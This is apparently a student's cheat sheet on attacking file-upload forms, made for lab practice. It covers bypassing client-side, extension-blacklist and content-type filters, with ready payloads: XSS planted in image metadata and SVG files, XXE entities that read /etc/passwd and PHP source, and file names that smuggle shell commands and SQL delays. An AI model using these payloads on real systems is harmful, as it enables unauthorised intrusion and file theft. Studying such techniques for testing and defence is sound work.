# Types
- Web Shell: Connection with server in the webpage
- Reverse Shell: Connection direct with server a my system

Note:  /index.ext to determine what languages runs in the server (i.e index.php)

# Bypassing Filters
## Client-Side Validation
- BackEnd
Changing the file's content type upload
<img width="2806" height="790" alt="image" src="https://github.com/user-attachments/assets/1917b5be-45c6-4231-9934-0a42c8ebc1f4" />

- FrontEnd
Removing validation like extension types of file or removing the js function
<img width="1942" height="455" alt="image" src="https://github.com/user-attachments/assets/db13c0f9-deef-43ff-b56c-1d105134b6cc" />

## Blacklist Filters

Deny .php so try to change the extension with [PHP List](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst/)
<img width="2108" height="643" alt="image" src="https://github.com/user-attachments/assets/760462b4-750b-473b-9e9e-96819c9daa51" />

## Type Filters
- Content-Type: [Content-Type Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt/)
<img width="2096" height="676" alt="image" src="https://github.com/user-attachments/assets/46a4bdcc-7ce2-4fbc-866a-af98d91709b1" />

- MIME-Type: [Start Type File](https://en.wikipedia.org/wiki/List_of_file_signatures/)
<img width="2076" height="710" alt="image" src="https://github.com/user-attachments/assets/9d8b4126-f691-46b4-a848-affccc63f44e" />

## Limited File Uploads
### XSS
- Add xss in the file:
```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```
- Add xxe in the file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```
## Injections in File Name
```bash
file$(whoami).jpg
file`whoami`.jpg
File.jpg||whoami
file';select+sleep(5);--.jpg
```
